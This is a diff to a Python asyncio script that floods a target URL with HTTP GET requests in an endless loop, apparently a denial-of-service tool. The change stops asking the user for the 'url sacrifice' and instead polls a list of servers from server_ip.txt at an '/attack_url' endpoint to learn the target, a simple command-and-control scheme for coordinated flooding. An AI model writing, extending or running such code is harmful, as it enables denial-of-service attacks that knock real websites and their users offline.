@@ -27,6 +27,25 @@ async def get(url: str) -> None:
         await asyncio.gather(*task)
 
 
+async def get_ip_sacrifice(ips: list) -> str:
+    async with aiohttp.ClientSession() as session:
+
+        for ip in ips:
+            async with session.get(ip + "/attack_url") as response:
+                if response.status == 200:
+                    ip_sacrifice = await response.json()
+        return ip_sacrifice.get("url")
+
+
+async def reed_servers_ip() -> list:
+    ips_servers = []
+
+    with open("server_ip.txt", "r") as f:
+        for line in f.readlines():
+            ips_servers.append(line.strip())
+    return ips_servers
+
+
 async def post(url) -> None:
     pass
 
@@ -39,13 +58,12 @@ async def delete(url) -> None:
     pass
 
 
-
-
-
 async def main():
-    url = str(input("Input url sacrifice: "))
+    ips_servers = await reed_servers_ip()
+    ip_sacrifice = await get_ip_sacrifice(ips_servers)
+
     while True:
-        await get(url)
+        await get(ip_sacrifice)
 
 
 if __name__ == '__main__':
